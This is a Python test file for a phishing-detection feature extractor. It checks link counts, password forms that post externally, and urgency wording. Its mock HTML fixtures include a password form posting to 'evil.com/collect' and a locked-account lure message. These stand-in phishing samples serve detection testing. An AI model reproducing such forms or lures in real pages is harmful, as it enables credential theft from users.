import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from page_features import extract  # noqa: E402


def _mock_response(html, url="https://example.com", history=None):
    resp = MagicMock()
    resp.text = html
    resp.url = url
    resp.history = history or []
    return resp


@patch("page_features._safe_get")
def test_external_links_counted(mock_get):
    mock_get.return_value = _mock_response("""
        <html><body>
        <a href="https://example.com/about">internal</a>
        <a href="https://evil.com/steal">external</a>
        <a href="#">empty</a>
        </body></html>
    """)
    f = extract("https://example.com")
    assert f["num_links"] == 3
    assert f["pct_external_links"] > 0
    assert f["num_empty_links"] == 1


@patch("page_features._safe_get")
def test_password_form_detected(mock_get):
    mock_get.return_value = _mock_response("""
        <html><body>
        <form action="https://evil.com/collect" method="POST">
            <input type="password" name="pw">
        </form>
        </body></html>
    """)
    f = extract("https://example.com")
    assert f["form_has_password"] == 1
    assert f["form_posts_external"] == 1


@patch("page_features._safe_get")
def test_urgency_words(mock_get):
    mock_get.return_value = _mock_response("""
        <html><body>
        <p>Your account has been locked! Verify immediately or it will expire.</p>
        </body></html>
    """)
    f = extract("https://example.com")
    assert f["urgency_word_count"] >= 3


@patch("page_features._safe_get")
def test_network_failure_returns_empty(mock_get):
    mock_get.return_value = None
    f = extract("https://unreachable.example")
    assert f == {}
